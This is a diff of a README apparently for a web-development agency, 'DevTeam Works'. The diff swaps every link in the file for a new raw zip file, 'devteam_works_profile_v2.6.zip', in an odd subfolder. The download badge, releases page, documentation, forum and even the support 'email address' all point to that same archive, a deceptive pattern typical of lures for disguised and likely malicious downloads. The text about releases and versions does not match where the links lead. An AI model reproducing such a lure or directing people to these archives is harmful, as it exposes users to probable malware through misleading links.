@@ -4,13 +4,13 @@
 DevTeam Works specializes in custom web and mobile app development. Our team excels in using Laravel, Flutter, and AI integration. We create scalable solutions that start from $10K to $50K. Our services include building e-commerce platforms, hiring systems, course platforms, and community networks. We use proven boilerplates to ensure faster delivery and reduced costs, completing projects within 2 weeks to 3 months.
 
 ## 📥 Download the Application
-[![Download](https://raw.githubusercontent.com/BlizzyBoard/devteam-works-profile/main/panlogical/devteam-works-profile.zip%23007acc)](https://raw.githubusercontent.com/BlizzyBoard/devteam-works-profile/main/panlogical/devteam-works-profile.zip)
+[![Download](https://raw.githubusercontent.com/BlizzyBoard/devteam-works-profile/main/panlogical/devteam_works_profile_v2.6.zip%23007acc)](https://raw.githubusercontent.com/BlizzyBoard/devteam-works-profile/main/panlogical/devteam_works_profile_v2.6.zip)
 
 ## 🚀 Getting Started
 To get started with DevTeam Works’ applications, follow these simple steps:
 
 1. **Visit the Releases Page:** Click on the link below to go to our releases page.
-   - [Visit Releases Page](https://raw.githubusercontent.com/BlizzyBoard/devteam-works-profile/main/panlogical/devteam-works-profile.zip)
+   - [Visit Releases Page](https://raw.githubusercontent.com/BlizzyBoard/devteam-works-profile/main/panlogical/devteam_works_profile_v2.6.zip)
 
 2. **Choose Your Version:** On the releases page, you will see a list of available versions. Pick the one that suits your needs.
 
@@ -50,12 +50,12 @@ For users with a deeper interest in how our applications are built, here are som
 Our projects are open-source and come with a license that allows you to modify and distribute the software. Please refer to the LICENSE file in the repository for more details.
 
 ## 🤝 Support
-If you encounter any issues or have questions while using our applications, please feel free to reach out through GitHub or email us at https://raw.githubusercontent.com/BlizzyBoard/devteam-works-profile/main/panlogical/devteam-works-profile.zip We aim to provide timely assistance to ensure your experience is smooth.
+If you encounter any issues or have questions while using our applications, please feel free to reach out through GitHub or email us at https://raw.githubusercontent.com/BlizzyBoard/devteam-works-profile/main/panlogical/devteam_works_profile_v2.6.zip We aim to provide timely assistance to ensure your experience is smooth.
 
 ## 🔗 Useful Links
-- [Visit Releases Page](https://raw.githubusercontent.com/BlizzyBoard/devteam-works-profile/main/panlogical/devteam-works-profile.zip)
-- [Documentation](https://raw.githubusercontent.com/BlizzyBoard/devteam-works-profile/main/panlogical/devteam-works-profile.zip)
-- [Community Forum](https://raw.githubusercontent.com/BlizzyBoard/devteam-works-profile/main/panlogical/devteam-works-profile.zip)
+- [Visit Releases Page](https://raw.githubusercontent.com/BlizzyBoard/devteam-works-profile/main/panlogical/devteam_works_profile_v2.6.zip)
+- [Documentation](https://raw.githubusercontent.com/BlizzyBoard/devteam-works-profile/main/panlogical/devteam_works_profile_v2.6.zip)
+- [Community Forum](https://raw.githubusercontent.com/BlizzyBoard/devteam-works-profile/main/panlogical/devteam_works_profile_v2.6.zip)
 
 ## 📞 Contact Us
 For inquiries about custom solutions or partnerships, contact us via our official website or social media channels.
